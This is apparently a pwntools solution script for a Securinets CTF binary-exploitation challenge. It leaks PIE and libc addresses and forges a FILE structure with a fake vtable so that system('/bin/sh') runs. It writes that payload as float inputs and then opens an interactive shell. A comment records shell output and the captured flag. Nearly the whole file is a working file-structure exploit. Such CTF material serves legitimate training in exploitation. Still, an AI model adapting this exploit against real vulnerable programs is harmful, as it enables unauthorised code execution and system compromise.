#!/usr/bin/python

from pwn import *

PATH = './success'

GDBSCRIPT = '''
source ~/Pwngdb/pwngdb.py
b *get_name+82
b *main+174
'''

HOST = 'bin.q21.ctfsecurinets.com'
PORT = 1340

# $ id
# uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
# $ ls -l
# total 2012
# -rwxrwxrwx 1 root root      83 Oct 16 14:17 flag
# -rwxr-xr-x 1 root root      53 Mar 20 19:19 launch.sh
# -rwxrwxrwx 1 root root 2030544 Mar 20 19:02 libc.so.6
# -rw-r--r-- 1 ctf  ctf      178 Mar 21 17:15 logged_users.txt
# -rwxrwxr-x 1 root root   13424 Mar 20 14:02 main2_success
# $ cat flag
# flag{exploiting_files_with_floats_is_really_cool_cee02ce60690afdbdb1f4fcd20a03aaa}


def debug(gdbscript):
    if type(r) == process:
        gdb.attach(r, gdbscript , gdb_args=["--init-eval-command='source ~/peda/peda.py'"])
        # gdb.attach(r, gdbscript , gdb_args=["--init-eval-command='source ~/.gdbinit_pwndbg'"])

def toFloat(value):
    if value == 0:
        return 0
    
    result = struct.unpack("<f", p32(value))[0]
    
    if str(result) == 'nan':
        return 0

    return result


def exploit(r):
    r.sendafter(': ', 'A' * 0x8)
    pie = uu64(r.recvline(0).split()[2][8:]) - 0x1090

    r.sendafter(': ', 'A' * 0x10)
    libc.address = uu64(r.recvline(0).split()[2][0x10:]) - libc.sym['_IO_file_jumps']

    info(f'PIE 0x{pie:x}')
    info(f'LIBC 0x{libc.address:x}')

    r.sendafter(': ', '\n')
    r.sendafter(': ', '64')

    rdi = libc.search(b'/bin/sh').__next__()
    fake_vtable = (libc.sym['_IO_file_jumps'] + 0xd8) - 2 * 8

    file_struct = FileStructure()
    file_struct._IO_buf_base = 0
    file_struct._IO_buf_end = (rdi - 100) // 2
    file_struct._IO_write_ptr = (rdi - 100) // 2
    file_struct._IO_write_base = 0
    file_struct._wide_data = 1
    file_struct._lock = pie + elf.sym['ch'] + 0x80
    file_struct.vtable = fake_vtable
    
    payload = b''
    payload += bytes(file_struct)
    payload += p64(libc.sym['system'])

    # # print(hexdump(payload))

    for i in range(0, len(payload), 8):
        target = u64(payload[i:i+8])
        r.sendlineafter(': ', f'{toFloat(target & 0xFFFFFFFF)}')
        r.sendlineafter(': ', f'{toFloat(target >> 32)}')
    
    for _ in range(6):
        r.sendlineafter(': ', f'{toFloat(0)}')
    
    # debug(GDBSCRIPT)
    
    r.sendlineafter(': ', f'{toFloat((pie + elf.sym.ch) & 0xFFFFFFFF)}')
    r.interactive()

if __name__ == '__main__':
    elf  = ELF(PATH)
    libc = ELF('./libc.so.6', 0)

    context.arch = 'amd64'
    uu64 = lambda x: u64(x.ljust(8, b'\0'))

    if args.REMOTE:
        r = remote(HOST, PORT)
    else:
        r = process(PATH, aslr=0, env={
            'LD_PRELOAD' : './libc.so.6'
        })
    exploit(r)